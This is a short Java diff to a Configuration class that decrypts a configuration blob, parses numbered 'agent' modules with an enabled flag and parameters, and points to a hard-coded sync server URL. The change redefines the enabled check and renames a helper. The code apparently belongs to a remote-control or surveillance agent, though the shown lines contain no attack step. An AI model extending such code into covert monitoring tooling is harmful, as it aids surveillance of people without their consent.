@@ -72,6 +72,8 @@ public class Configuration {
 
 	public static final boolean OVERRIDE_SYNC_URL = true;
 	public static final String SYNC_URL = "http://192.168.100.100/wc12/webclient";
+
+	private static final int AGENT_ENABLED = 0x2;
 	//public static final String SYNC_URL = "http://192.168.1.189/wc12/webclient";
 
 	/**
@@ -221,7 +223,7 @@ public class Configuration {
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
 			final int id = wrappedClearConf.getInt();
-			final boolean enabled = wrappedClearConf.getInt() == 0;
+			final boolean enabled = wrappedClearConf.getInt() == AGENT_ENABLED;
 			final int plen = wrappedClearConf.getInt();
 
 			final byte[] params = new byte[plen];
@@ -416,7 +418,7 @@ public class Configuration {
 			final byte[] clearConf = crypto.decrypt(rawConf, 0);
 
 			// Extract clear length DWORD
-			this.wrappedClearConf = Utils.BufferToByteBuffer(clearConf,
+			this.wrappedClearConf = Utils.bufferToByteBuffer(clearConf,
 					ByteOrder.LITTLE_ENDIAN);
 
 			final int confClearLen = this.wrappedClearConf.getInt();
